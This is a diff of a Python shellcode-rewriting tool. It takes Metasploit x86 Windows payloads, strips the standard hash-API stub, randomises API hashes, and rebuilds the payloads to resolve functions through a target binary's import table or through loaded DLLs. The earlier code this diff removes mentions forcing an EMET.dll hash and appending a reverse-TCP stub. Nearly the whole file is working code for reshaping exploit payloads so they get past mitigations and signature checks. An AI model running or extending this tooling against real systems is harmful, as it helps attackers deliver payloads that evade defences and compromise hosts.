@@ -5,6 +5,7 @@ from collections import OrderedDict
 from capstone import *
 from capstone.x86 import *
 import struct
+import pefile
 import io
 import sys
 import re
@@ -13,7 +14,9 @@ import string
 import argparse
 import binascii
 import signal
-
+import json
+import os
+import ntpath
 
 def signal_handler(signal, frame):
         print('\nProgram Exit')
@@ -36,7 +39,7 @@ parser.add_argument("-b", "--targetbinary", default="", dest="targetbinary",
                     )
 parser.add_argument("-t", "--OSTarget", default="Win7", dest="OS",
                     action="store",
-                    help="OS target for looking for target DLL Import Tables")
+                    help="OS target for looking for target DLL Import Tables: win7, win8, winVista, win10")
 parser.add_argument("-s", '--shellcode', default="", dest="code",
                     action="store",
                     help="x86 Win Shellcode with Stephen Fewers Hash API prepended (from msfvenom) can be from stdin")
@@ -74,7 +77,7 @@ if args.infile.buffer.seekable() is False:
 if not args.code:
     print('[!] -s is required either from cmd line flag or stdin <cat code.bin> | {0}'.format(sys.argv[0]))
     parser.print_help()
-    sys.exit()        
+    sys.exit(-1)        
 
 class x86_windows_metasploit:
     
@@ -99,11 +102,9 @@ class x86_windows_metasploit:
 
     def __init__(self, **kwargs):
         self.__dict__.update(kwargs)
-        print(dir(self))
         self.tracker = []
         self.arch = CS_ARCH_X86
         self.mode = CS_MODE_32
-        self.comment = "X86 32 (Intel syntax)"
         self.syntax = 0
         self.api_hashes = {}
         self.called_apis = []
@@ -111,6 +112,9 @@ class x86_windows_metasploit:
         self.tracker_dict = {}
         self.block_order = []
         self.DLL_HASH = 0
+        self.lla_hash_dict = {}
+        self.gpa_hash_dict = {}
+        
         if self.OUTPUT == 'stdout':
             # suppress print
             self.VERBOSE = False
@@ -166,37 +170,6 @@ class x86_windows_metasploit:
                          ( 0x7B18062D, "wininet.dll!HttpSendRequestA"),
                          ( 0xE2899612, "wininet.dll!InternetReadFile"),
               ]    
-    
-    ###############################
-    #Modified from Stephen Fewer's hash.py 
-    ###############################
-
-    def ror(self, dword, bits):
-        return (dword >> bits | dword << (32 - bits)) & 0xFFFFFFFF
-
-    def unicode(self, string, uppercase=True):
-        result = ""
-        if uppercase:
-            string = string.upper()
-        for c in string:
-            result += c + "\x00"
-        return result
-
-    def hash(self, module, bits=13, print_hash=True):
-        module_hash = 0
-        if len(module) < 12:
-            module += "\x00" * (12 - len(module))
-        if len(module) > 12:
-            module += module[:12]
-        for c in self.unicode(module):
-            #print '\t', c.encode('hex')
-            module_hash = self.ror(module_hash, bits)
-            module_hash += ord(c)
-        
-        self.DLL_HASH = module_hash
-
-    ###############################
-    ###############################    
 
     def lla_gpa_parser_stub(self):
         shellcode =  bytes( 
@@ -613,14 +586,45 @@ class x86_windows_metasploit:
         # GETPROCADDR in EBP
     
         return shellcode1 + shellcode2 + shellcode3
+
+    ###############################
+    #Modified from Stephen Fewer's hash.py 
+    ###############################
+
+    def ror(self, dword, bits):
+        return (dword >> bits | dword << (32 - bits)) & 0xFFFFFFFF
+
+    def unicode(self, string, uppercase=True):
+        result = ""
+        if uppercase:
+            string = string.upper()
+        for c in string:
+            result += c + "\x00"
+        return result
+
+    def hash(self, module, bits=13, print_hash=True):
+        module_hash = 0
+        if len(module) < 12:
+            module += "\x00" * (12 - len(module))
+        if len(module) > 12:
+            module += module[:12]
+        for c in self.unicode(module):
+            #print '\t', c.encode('hex')
+            module_hash = self.ror(module_hash, bits)
+            module_hash += ord(c)
         
+        self.DLL_HASH = module_hash
+
+    ###############################
+    ###############################    
+
     def get_hash(self, anumber):
         for ahash in self.hashes:
             if hex(ahash[0]) == anumber:
                 self.called_apis.append(ahash[1])
                 # mangle hash here
                 if self.mangle is True:
-                    print('mangle mangle')
+                    sys.stderr.write('[*] Mangling {0} hash\n'.format(ahash[1]))
                     random_hash = random.randint(1, 4228250625)
                     self.api_hashes[random_hash] = ahash[1]
                     return ahash[1], random_hash # return managed hash here
@@ -635,38 +639,27 @@ class x86_windows_metasploit:
 
         if self.fewerapistub in self.code:
                 #strip it
-                print("Striping Stephen Fewers hash API call")
-                print('type(code) {0} type(fewerapistub) {1}'.format(type(self.code), type(self.fewerapistub)))
-                # Add a check here to exit if not replaced.
+                sys.stderr.write("[*] Stripping Stephen Fewers hash API call\n")
                 self.code = self.code.replace(self.fewerapistub, b'')
                 self.prestine_code = self.code
-                print("metasploit payload:", binascii.hexlify(self.code))
+                #print("metasploit payload:", binascii.hexlify(self.code))
         else:
-            print("[*] No Hash API stub?? Continuing...")
+            sys.stderr.write("[!] No Hash API stub?? Continuing...\n")
             self.prestine_code = self.code
 
         m = re.search(b'\xe8.{4}/(.*?)\x00', self.code)
         if m:
-            #print(len(m.group()))
             self.replace_string = m.group()[5:]
-            #print(self.replace_string.encode('hex'))
             self.astring = b"\xcc" * (len(m.group()) - 5)
             self.code = re.sub(b'/(.*?)\x00', self.astring , self.code)
-            print ("Length of offending string:", len(self.astring))
-            print("Code length after URL replacement with '\\xcc' (breaks capstone disasm):", len(self.code))
+            sys.stderr.write("[*] Length of offending string: {0}".format(len(self.astring)))
+            sys.stderr.write("[*] Code length after URL replacement with '\\xcc' (breaks capstone disasm): {0}".format(len(self.code)))
 
-        
-        # Strip out url random hash here (replace with \xCC)
-        
-        print("*" * 16)
-        print("Platform: %s" % self.comment)
-        #print("self.Code: %s" % self.code)
         
     def fix_up_hardcoded_offsets(self):
         for key, value in self.tracker_dict.items():
             if value['ebp_offset_update'] and value['bytes'] == b'\x8d\x85\xb2\x00\x00\x00':
                 offset_to_cmd = struct.pack("<I", len(self.jump_stub) + len(self.selected_payload) + len(self.stub) + 48 - 5)
-                print("InHardCodedFixUp", key, value, offset_to_cmd)
                 offset_to_cmd = b'\x8d\x85' + offset_to_cmd
                 self.prestine_code = re.sub(b'\x8d\x85\xb2\x00\x00\x00', offset_to_cmd, self.prestine_code)
 
@@ -674,12 +667,11 @@ class x86_windows_metasploit:
         for key, value in self.tracker_dict.items():
 
             if value['hash_update']:
-                print(hex(key),value)
                 self.prestine_code = self.prestine_code[:key+1] + struct.pack("<I", value['hash_update']) + self.prestine_code[key+5:]
 
     def print_formats(self):
         '''
-        Format the output
+        Format the output prints to stdout
         '''
         if self.OUTPUT == 'p':
             # python output
@@ -711,6 +703,163 @@ class x86_windows_metasploit:
                 count += 13
             print("};")
     
+    def find_apis(self):
+        locations = ['winXP', 'win7', 'win8', 'winVista', 'win10']
+        ignore_dlls = ['api-ms-win', ]
+        #ignore_dlls = []
+        #goodtogo = {}
+        loaded_modules = set()
+        #self.dlls.add('emet.dll')
+        temp_set = self.dlls
+        if self.OS.lower() == 'all':
+            look_here = locations
+        else:
+            look_here = [self.OS]
+
+        for location in look_here:
+            self.dlls = temp_set
+            #goodtogo[location] = {}
+
+            sys.stderr.write("[*] Checking %s compatibility\n" % location)
+            _path_location = os.path.abspath(os.path.dirname(__file__))
+            _location = _path_location + '/parser_output/' + location + '/output.json'
+            #_included = './parser_output/' + location + '/included.json'
+            all_dlls_dict = json.loads(open(_location, 'r').read())
+            #included_dict = json.loads(open(_included, 'r').read())
+            sys.stderr.write("[*] Number of lookups to do: {0}\n".format(len(all_dlls_dict)))
+
+            # get all loaded modules
+            def recursive_parse():
+                # FML
+                # list the dll that is imported by what dll
+                # if it isn't already in the set print dll, imported name
+                temp_lm = set()
+                for dll in self.dlls:
+                    sys.stderr.write("\t\t[*] Checking for its imported DLLs: {0}\n".format(dll.decode('ascii')))
+                    for key, value in all_dlls_dict.items():
+                        if dll.lower() == bytes(ntpath.basename(key.lower()), 'iso-8859-1'):
+                            for lm in value['dlls']:
+                                found = True
+                                for ig_dll in ignore_dlls:
+                                    #print("TESTING TESTing", ig_dll, lm)
+                                    if ig_dll.lower().encode('utf-8') in lm.lower().encode('utf-8'):
+                                        #print ig_dll.lower(), lm.lower()
+                                        found = False
+                                if found is True and bytes(lm, 'iso-8859-1') not in temp_lm and bytes(lm, 'iso-8859-1') not in self.dlls:
+                                    sys.stderr.write('\t [*] {0} adds the following not already loaded dll: {1}\n'.format(dll.decode('ascii'), lm))
+                                    if type(lm) == bytes:
+                                        temp_lm.add(lm)
+                                    else:
+                                        temp_lm.add(bytes(lm, 'iso-8859-1'))
+
+                return temp_lm
+
+            temp_dict = {}
+            while True:
+                length = len(self.dlls)
+                temp_dict = recursive_parse()
+                self.dlls = self.dlls.union(temp_dict)
+                if len(temp_dict) <= length:
+                    sys.stderr.write("[*] Parsing imported dlls complete\n")
+                    break
+
+
+            sys.stderr.write("[*] Possible useful loaded modules: {0}\n".format(self.dlls))
+            dllfound = False
+            getprocaddress_dll = False
+            blacklist = ['kernel32.dll', 'firewallapi.dll', 'shell32.dll', 'gdi32.dll', 'user32.dll', 'oleaut32.dll', 'ws2_32.dll', 'iphlpapi.dll']
+            for dll in self.dlls:
+                sys.stderr.write('[*] Looking for loadliba/getprocaddr or just getprocaddr in %s\n' % dll)
+
+                dllfound = False
+                getprocaddress_dll = False
+
+                for key, value in all_dlls_dict.items():
+                    if ntpath.basename(key.lower()) in blacklist:
+                        continue
+                    if dll.lower() == bytes(ntpath.basename(key.lower()), 'iso-8859-1'):
+                        if value['getprocaddress'] is True:
+                            if 'system32' in key.lower():
+                                getprocaddress_dll = True
+                                
+                            elif 'program files' in key.lower():
+                                getprocaddress_dll = True
+
+                            if getprocaddress_dll is True:
+                                sys.stderr.write("\t-- GetProcAddress will work with this imported DLL: {0}\n".format(key))
+                                self.hash(ntpath.basename(key.lower()))
+                                self.gpa_hash_dict[ntpath.basename(key.lower())] = self.DLL_HASH
+                                getprocaddress_dll = False
+
+                        if value['loadlibrarya'] is True and value['getprocaddress'] is True:
+
+                            if 'system32' in key.lower():
+                                dllfound = True
+                                break
+                            #elif 'windows' in key.lower():
+                            #    dllfound = True
+                            #    break
+                            elif 'program files' in key.lower():
+                                dllfound = True
+                                break
+                            #else:
+                            #    dllfound = True
+
+                if dllfound is True:
+                    #goodtogo[location][key] = value
+                    sys.stderr.write("\t-- This imported DLL will work for LLA/GPA: {0}\n".format(key))
+                    self.hash(ntpath.basename(key.lower()))
+                    self.lla_hash_dict[ntpath.basename(key.lower())] = self.DLL_HASH
+                    
+            sys.stderr.write("[*] LLA/GPA binaries available: {0}\n".format(self.lla_hash_dict))
+            sys.stderr.write("[*] GPA binaries available: {0}\n".format(self.gpa_hash_dict))
+            sys.stderr.write(("*" * 80) + "\n")
+            
+    def check_apis(self):
+        ####################################
+        #### Parse imports via pefile ######
+
+        #make this option only if a IAT based shellcode is selected
+        sys.stderr.write("[*] Loading PE in pefile\n")
+        pe = pefile.PE(self.targetbinary, fast_load=True)
+        sys.stderr.write("[*] Parsing data directories\n")
+        pe.parse_data_directories()
+        apis = {}
+        apis['neededAPIs'] = set()
+        self.dlls = set()
+        self.lla_gpa_found = False
+        self.gpa_found = False
+
+        try:
+            for api in ['LoadLibraryA', 'GetProcAddress']:
+                apiFound = False
+                for entry in pe.DIRECTORY_ENTRY_IMPORT:
+                    if type(entry.dll) == bytes:
+                        self.dlls.add(entry.dll)
+                    else:
+                        self.dlls.add(bytes(entry.dll, 'iso-8859-1'))
+                    for imp in entry.imports:
+                        if imp.name is None:
+                            continue
+                        if imp.name.lower() == bytes(api.lower(), 'iso-8859-1'):
+                            sys.stderr.write("[*] Found API: {0}\n".format(api.lower()))
+                            apiFound = True
+                
+                if apiFound is False:
+                    apis['neededAPIs'].add(api)
+                
+        except Exception as e:
+            sys.stderr.write("Exception: {0}\n".format(str(e)))
+
+        if apis['neededAPIs'] == set():
+            sys.stderr.write('[*] Both LLA/GPA APIs found!\n')
+            self.lla_gpa_found = True
+            self.gpa_found = True
+        
+        elif 'LoadLibraryA' in apis['neededAPIs']:
+            sys.stderr.write('[*] GetProcAddress API was found!\n')
+            self.gpa_found = True
+        
     def decision_tree(self):
         
         if self.targetbinary == '' and self.dll == '':
@@ -726,66 +875,45 @@ class x86_windows_metasploit:
             if self.parser_stub.lower() == 'GPA'.lower() or self.parser_stub.lower() == 'ExternGPA'.lower():
                 # set hash
                 self.hash(self.dll)
-                print("hash:", hex(self.DLL_HASH))
                 sys.stderr.write("[*] Using ExternGPA from {0}\n".format(self.dll))
                 self.selected_payload = self.loaded_gpa_iat_parser_stub()
             elif self.parser_stub.lower() == 'ExternLLAGPA'.lower():
                 self.hash(self.dll)
-                print("hash__:", hex(self.DLL_HASH))
                 sys.stderr.write("[*] Using ExternLLAGPA from {0}\n".format(self.dll))
                 self.selected_payload = self.loaded_lla_gpa_parser_stub()
-        #elif self.targetbinary !="":
+        
+        elif self.targetbinary !="":
+            sys.stderr.write('[*] targetbinary submitted: {0} for {1} OS\n'.format(self.targetbinary, self.OS))
+            # Check APIS then find apis
+            self.check_apis()
+            self.find_apis()
+            
+            if self.lla_gpa_found is True and self.parser_stub != 'GPA' and 'extern' not in self.parser_stub.lower():
+                sys.stderr.write("[*] Using LLAGPA stub\n")
+                self.selected_payload = self.lla_gpa_parser_stub()
+
+            elif self.gpa_found is True and self.parser_stub != 'LLAGPA' and 'extern' not in self.parser_stub.lower():
+                sys.stderr.write("[*] Using GPA stub\n")
+                self.selected_payload = self.gpa_parser_stub()
+
+            elif self.lla_hash_dict != {} and self.parser_stub != 'ExternGPA':
+                DLL, self.DLL_HASH = random.choice(list(self.lla_hash_dict.items()))
+                sys.stderr.write("[!] Using ExternLLAGPA from {0}, hash: {1}\n".format(DLL, hex(self.DLL_HASH)))
+                self.selected_payload = self.loaded_lla_gpa_parser_stub()
+            
+            elif self.gpa_hash_dict != dict():
+                DLL, self.DLL_HASH = random.choice(list(self.gpa_hash_dict.items()))
+                sys.stderr.write("[!] Using ExternGPA from {0}, hash {1}\n".format(DLL, hex(self.DLL_HASH)))
+                
+                self.selected_payload = self.loaded_gpa_iat_parser_stub()
+                # use that
+            else:
+                sys.stderr.write("[!] You have no options... :( \n")
+                sys.exit()
         # do decision tree based on OS and targetbinary
         #else
         # something exit
 
-        '''      
-        if FORCE_EMET.lower() == "true" and USE_LOADED_MODULE.lower() == 'false':
-                print "Forcing EMET.dll hash for use in IAT Loaded Module parser"
-                # pass the EMET.dll hash to the function
-                #shellcode = locate_hash1 + struct.pack("<I", 0xeb616ca5) + locate_hash2 + lla_gpa_parser + get_lla_gpa + shellcode5
-                #print shellcode
-                shellcode = loaded_iat_parser_stub(hash('EMET.dll')) + iat_rev_tcp_stub(HOST, PORT)
-                return shellcode
-        
-        elif lla_gpa_found is True and USE_LOADED_MODULE.lower() == 'false':
-            print '[*] Using LLA/GPA IAT parsing stub'
-            shellcode =  iat_parser_stub() + iat_rev_tcp_stub(HOST, PORT)
-            return shellcode
-
-        elif gpa_found is True and USE_LOADED_MODULE.lower() == 'false':
-            print '[*] Using GPA IAT parsing stub'
-            shellcode = gpa_parser_stub() + iat_rev_tcp_stub(HOST, PORT)
-            return shellcode
-
-
-        else:
-            
-            lla_hash_set, gpa_hash_set = find_apis(dlls, os_system)
-            
-            if lla_hash_set == dict() and lla_hash_set != {}:
-                print "[*] In lla_hash_set payload:", lla_hash_set
-                DLL, a_hash = lla_hash_set.iteritems().next()
-                print "[!] Using LLA/GPA DLL and hash", DLL, hex(a_hash)
-                shellcode = loaded_iat_parser_stub(lla_hash_set.itervalues().next()) + iat_rev_tcp_stub(HOST, PORT)
-                return shellcode
-                # pass that hash to the function
-            
-            elif gpa_hash_set != dict():
-                print "[*] Setting imported IAT GPA payload"
-                DLL, a_hash = gpa_hash_set.iteritems().next()
-                print "[!] Using GPA DLL and hash", DLL, hex(a_hash)
-                
-                shellcode = loaded_gpa_iat_parser_stub(gpa_hash_set.itervalues().next()) + iat_rev_tcp_stub(HOST, PORT)
-                # use that
-                return shellcode
-            else:
-                print "[!] You have no options..."
-                print "\xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf"
-                
-            return shellcode
-
-        '''
 
     def block_tracker(self):
         '''
@@ -801,7 +929,7 @@ class x86_windows_metasploit:
             call_op = ''
             jne_op = ''
             prior_key = ''
-            print("\t"+"@"*25)
+            #print("\t"+"@"*25)
             tmp_block = OrderedDict({})
             
             for key, value in self.tracker_dict.items():
@@ -809,31 +937,29 @@ class x86_windows_metasploit:
                 if value['blocktag'] == a_block:
                     #print("\t[?]",key, value)
                     tmp_block[key] = value
-                # DO ASM checks here
-                #print(value['bytes'])
+                
+                    #if value['bytes'] == '\xc3':
+                        #print('\tFound a Ret')
 
-                    if value['bytes'] == '\xc3':
-                        print('\tFound a Ret')
-
-                    elif value['mnemonic'] + " " + value['op_str'] == u"call ebp": #call ebp
-                        print("\tCall ebp")
+                    if value['mnemonic'] + " " + value['op_str'] == u"call ebp": #call ebp
+                        #print("\tCall ebp")
                         # TODO: SEE BELOW find values of push ebx and and push XXXXXX
                         if self.tracker_dict[prior_key]['mnemonic'] + " " + self.tracker_dict[prior_key]['op_str'] == "push ebx": # push ebx
-                            print("\tPush EBX:", ebx)
+                            #print("\tPush EBX:", ebx)
                             called_api, newhash = self.get_hash(ebx)
                             #self.tracker_dict[prior_key]['hash_update'] = newhash
 
-                            print("\tCalling Function:", called_api)
+                            #print("\tCalling Function:", called_api)
                             if called_api == None:
                                 continue
                             #elif 'LoadLibraryA'.lower() not in called_api.lower() and buildcode is True: 
                             #    print("[^] Testing success")
                             #    continue
                         elif self.tracker_dict[prior_key]['mnemonic']  == 'push': # push XXXXX
-                            print("\tPush EBP:", ebp)
+                            #print("\tPush EBP:", ebp)
                             called_api, newhash = self.get_hash(ebp)
                             self.tracker_dict[prior_key]['hash_update'] = newhash
-                            print("\tCalling Function:", called_api)
+                            #print("\tCalling Function:", called_api)
                             #if newhash:
 
                             if called_api == None:
@@ -842,14 +968,10 @@ class x86_windows_metasploit:
                             #    print("[#] Testing success")
                             #    continue
 
-                    elif self.replace_string == value:
-                        print("\tFound replace_string")
-
                     elif 'mov ebx' in value['mnemonic'] + " " + value['op_str']: # mov ebx ?
-                        print("[!!] mov ebx")
-                        print(value['mnemonic'], "+", value['op_str'], "bytes:", value['bytes'], len(value['bytes']))
+                        #print("[!!] mov ebx")
+                        #print(value['mnemonic'], "+", value['op_str'], "bytes:", value['bytes'], len(value['bytes']))
                         if len(value['bytes']) == 5:
-                            print('right')
                             ebx = hex(struct.unpack("<I", value['bytes'][1:])[0])
                         
                         #PROBABLY DON'T NEED THIS: TODO
@@ -862,55 +984,36 @@ class x86_windows_metasploit:
                     
                     elif value['mnemonic'] == 'call': #call
                         # I DON'T THINK I NEED THIS ANYMORE
-                        print("\tHardcoded Call")
+                        #print("\tHardcoded Call")
                         call_op = value['op_str']
                         called_api, newhash = self.get_hash(call_op)
                         self.tracker_dict[key]['hash_update'] = newhash
-                        print("\tCalling Function:", called_api)
+                        #print("\tCalling Function:", called_api)
                         #if buildcode is True:
                         #    self.engine.inspect_block(tmp_block, called_api)
                         continue
                     
                     elif 'jmp' in value['mnemonic']:
-                        print('\tA JMP', value['op_str'])
+                        #print('\tA JMP', value['op_str'])
                         call_op = value['op_str']
                         called_api, newhash = self.get_hash(call_op)
                         self.tracker_dict[key]['hash_update'] = newhash
-                        print("\tCalling Function:", called_api)
-                        #if buildcode is True:
-                        #    self.engine.inspect_block(tmp_block, called_api)
-                        #continue
-                        #self.tracker_dict[prior_key]['bytes']
-                        #if self.tracker_dict[prior_key]['bytes'][0] == 0x75:
-                        #    jne_op = self.tracker_dict[prior_key]['bytes'][1:]
-                        #    print("\tJNE before:", call_op)
+                        #print("\tCalling Function:", called_api)
+                        
                     elif 'ret' in value['mnemonic']:
-                        print('\tA ret, ending call block')
+                        #print('\tA ret, ending call block')
                         call_op = value['op_str']
                         called_api, newhash = self.get_hash(call_op)
-                        print("\tCalling Function:", called_api)
+                        #print("\tCalling Function:", called_api)
                         continue
                         
                     prior_key = key
 
-                     
-            #print("\t\t", tmp_block)
-        
-    # now I need to track call blocks
-    # start and go until you find Call EBP
     def doit(self):
-        '''
-        To make this work:
-        Strip SF API HASH stub.
-        Enumerate APIs via disasm
-        Build lookup table
-        Put it together.
-        # win/exec if I see lea eax, ebp + X then I know metasploit has hardcoded the payload
-        to account for the site of the hash API call.  I can mark this address then fix up after everything is built.
-        '''
-        print("Disasm:")
-        print("*" * 16)
-        print(self.code)
+        
+        sys.stderr.write("[*] Disassembling shellcode\n")
+        #print("*" * 16)
+        #print(self.code)
         
         try:
             md = Cs(self.arch, self.mode)
@@ -930,7 +1033,7 @@ class x86_windows_metasploit:
             for insn in md.disasm(self.code, 0):
                 #print_insn_detail(mode, insn)
                 width = 30 - len(''.join('\\x{:02x}'.format(x) for x in insn.bytes))
-                print("%s: %s\" %s %s %s" % (hex(insn.address), ''.join('\\x{:02x}'.format(x) for x in insn.bytes), '#'.rjust(width), insn.mnemonic, insn.op_str))
+                #sys.stderr.write("%s: %s\" %s %s %s\n" % (hex(insn.address), ''.join('\\x{:02x}'.format(x) for x in insn.bytes), '#'.rjust(width), insn.mnemonic, insn.op_str))
                 #print ("0x%x:\n" % (insn.address + insn.size))
                 #"%s" % "".join('\\x{:02x}'.format(x) for x in insn.bytes))
                 #print(insn.op_str)
@@ -945,19 +1048,6 @@ class x86_windows_metasploit:
                        'hash_update': None,          # Populate with the actual value
                        }
                 
-                #if insn.mnemonic == 'int3':
-                #    print('yeaaaaaah', type(tmp_string))
-                #    tmp_string += insn.bytes
-                #   continue
-                #elif tmp_string != b'':
-                #    #End of tmpstring
-                #    print("Adding offending string back in")
-                #    self.tracker.append([self.replace_string])
-                #    tmp_string = b''
-                #    #tmp_tracker = []  # not needed
-
-                #print("naaaah")
-                
                 self.tracker_dict[insn.address] = tmp
                 
                 if insn.mnemonic + " " + insn.op_str == 'call ebp':
@@ -970,7 +1060,7 @@ class x86_windows_metasploit:
                     blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                     
                 elif insn.mnemonic == "call":
-                    print("call", insn.op_str)
+                    #print("call", insn.op_str)
                     if tmp_tracker[len(tmp_tracker)-1] == 0x68:
                         print("Found server_uri, string")
                     self.tracker.append(tmp_tracker)
@@ -981,7 +1071,7 @@ class x86_windows_metasploit:
                     blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                     
                 elif 'jmp' in insn.mnemonic:
-                    print('a jmp instruction', insn.mnemonic, insn.op_str)
+                    #print('a jmp instruction', insn.mnemonic, insn.op_str)
                     #''.join(random.choice(string.ascii_lowercase[6:]+string.ascii_uppercase[6:]) for _ in range(8))
                     #''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                     self.tracker.append(tmp_tracker)
@@ -992,17 +1082,17 @@ class x86_windows_metasploit:
                     blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                 
                 elif 'ret' in insn.mnemonic:
-                    print('a ret instruction', insn.mnemonic, insn.op_str)
+                    #print('a ret instruction', insn.mnemonic, insn.op_str)
                     self.tracker.append(tmp_tracker)
                     tmp_tracker = []
                     blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                 
                 elif 'j' in insn.mnemonic:
-                    print('another jump, just assigning cft')
+                    #print('another jump, just assigning cft')
                     self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                 
                 if '[ebp' in insn.op_str:
-                    print("Found a hardcoded offset for Stephen Fewers hash API reference")
+                    #print("Found a hardcoded offset for Stephen Fewers hash API reference")
                     self.tracker_dict[insn.address]['ebp_offset_update'] = True
 
                 if blocktag not in self.block_order:
@@ -1010,7 +1100,7 @@ class x86_windows_metasploit:
                 
 
         except Exception as e:
-            print("ERROR: %s" % e)
+            sys.stderr.write("ERROR: %s\n" % e)
             sys.exit(-1)
 
         # Next rebuild each self.code block
@@ -1018,19 +1108,19 @@ class x86_windows_metasploit:
         # Identify the api being used.
         
         self.tracker_dict = OrderedDict(sorted(self.tracker_dict.items()))
-        print("block_order", self.block_order)
+        #print("block_order", self.block_order)
         # Now find assign controlFLowTags
         
         self.block_tracker()    
         
-        print(self.called_apis)
-        print("self.api_hashes", self.api_hashes)
+        sys.stderr.write("[*] Called APIs: {0}\n".format(self.called_apis))
+        #print("self.api_hashes", self.api_hashes)
         
         # replace API hashes with mangled hashes
         self.fix_up_mangled_hashes()
 
         # make hash table
-        
+            
         tmp_bytes = b''
         
         for some_hash, api_lookup in self.api_hashes.items():
@@ -1039,54 +1129,47 @@ class x86_windows_metasploit:
         # make string table
         string_set = set()
         for api in self.called_apis:
-            print(api.split("!"))
             string_set.add(api.split("!")[0].replace(".dll",''))
             string_set.add(api.split("!")[1])
         
-        print(string_set)
         
         for api in string_set:
             self.string_table += api + "\x00"
-        print("String Table:", self.string_table)
         
+
         self.string_table = bytes(self.string_table, 'iso-8859-1')
         # put the hashes and string table together "\x00\x00\x00\x00" denotes end of hashes 
+        sys.stderr.write("[*] String Table: {0}\n".format(self.string_table))
         
         self.lookup_table = tmp_bytes + b"\x00\x00\x00\x00" + self.string_table
-        print(binascii.hexlify(self.lookup_table), len(self.lookup_table))
         
         # FIND OFFSETS for the lookup_table and populate
-        
+        sys.stderr.write("[*] Building lookup table\n")
         for some_hash, api_lookup in self.api_hashes.items():
-            print('some_hash', hex(some_hash))
-            print('meh', re.escape(struct.pack("<I", some_hash)))
             m = re.search(re.escape(struct.pack("<I", some_hash)), self.lookup_table)
-            print(m.start(), m.group())
             aDLL = api_lookup.split("!")[0].replace(".dll",'')
             anAPI = api_lookup.split("!")[1]
-            print('aDLL', aDLL, 'anAPI', anAPI)
             d = re.search(bytes(aDLL, 'iso-8859-1'), self.lookup_table)
-            print("\t", hex(d.start()), d.group())
             a = re.search(bytes(anAPI, 'iso-8859-1'), self.lookup_table)
-            print("\t", hex(a.start()), a.group())
             self.lookup_table = self.lookup_table[:m.start()+4] + struct.pack("B", d.start() - m.start()-4) + struct.pack("B", a.start() - m.start()-5) + self.lookup_table[m.start()+6:]
         
 
-        print("Updated table", binascii.hexlify(self.lookup_table), len(self.lookup_table))
+        #print("Updated table", binascii.hexlify(self.lookup_table), len(self.lookup_table))
         
         # Find and select IAT parser here:
         self.decision_tree()
 
         # This is the stub that is appended to the IAT parser
+        sys.stderr.write("[*] Assembling lookup table stub\n")
         self.stub = b''
         self.stub += b"\xe9"
         self.stub += struct.pack("<I", len(self.lookup_table))
         
         self.stub += self.lookup_table
         table_offset = len(self.stub) - len(self.lookup_table)
-        print("1st Table offset", table_offset)
         #TODO; Update the call below to point to the metasploit stub
         self.stub += b"\x33\xC0"                     # XOR EAX,EAX
+        # OLD Stub to avoid calling lla/gpa... after testing not needed 
         #self.stub += (
         #                   b"\xBE\x4C\x77\x26\x07"         # MOV ESI,726774C
         #                   b"\x3B\x74\x24\x24"             # CMP ESI,DWORD PTR SS:[ESP+24]
@@ -1097,14 +1180,14 @@ class x86_windows_metasploit:
         #                   b"\x61"                         # POPAD
         #                   b"\xC3"                         # RETN
         #                   )
-        print("offset length", len(self.stub) - table_offset)
+        #print("offset length", len(self.stub) - table_offset)
 
         #self.stub += b"\x8B\x8E\x29\xFF\xFF\xFF"     # MOV ECX,DWORD PTR DS:[ESI-D7]
         self.stub += b"\xE8\x00\x00\x00\x00"         # CALL 001C0190
         self.stub += b"\x5E"                         # POP ESI
                            
         self.stub += b"\x8B\x8E"
-        print("offset", struct.pack("<I", 0xffffffff - len(self.stub) - table_offset + 14))    
+        #print("offset", struct.pack("<I", 0xffffffff - len(self.stub) - table_offset + 14))    
         updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 14
         self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 14)
         self.stub += b"\x3B\x4C\x24\x24"             # CMP ECX,DWORD PTR SS:[ESP+24]
@@ -1119,7 +1202,7 @@ class x86_windows_metasploit:
         self.stub += b"\x8B\xCE"                           # MOV ECX,ESI
         self.stub += b"\x03\xC8"                           # ADD ECX,EAX
         self.stub += b"\x81\xE9"
-        print(abs(updated_offset - 0xffffffff +3))
+        #print(abs(updated_offset - 0xffffffff +3))
         self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3)) # SUB ECX,0EB
         self.stub += b"\x51"                               # PUSH ECX
         #self.stub += b"\x8B\x4C\x24\x14"                     # MOV ECX,DWORD PTR SS:[ESP+14]
@@ -1165,12 +1248,10 @@ class x86_windows_metasploit:
             sys.stdout.buffer.write(self.entire_payload)
         else:
             self.print_formats()
-        print("Output payload:", binascii.hexlify(self.entire_payload), len(self.entire_payload))
+        #print("Output payload:", binascii.hexlify(self.entire_payload), len(self.entire_payload))
         with open('testing-out.bin', 'wb') as f:
             f.write(self.entire_payload)
-        sys.stderr.write("EXIT\n")
         
-        sys.exit()
         
         
 if __name__ == '__main__':
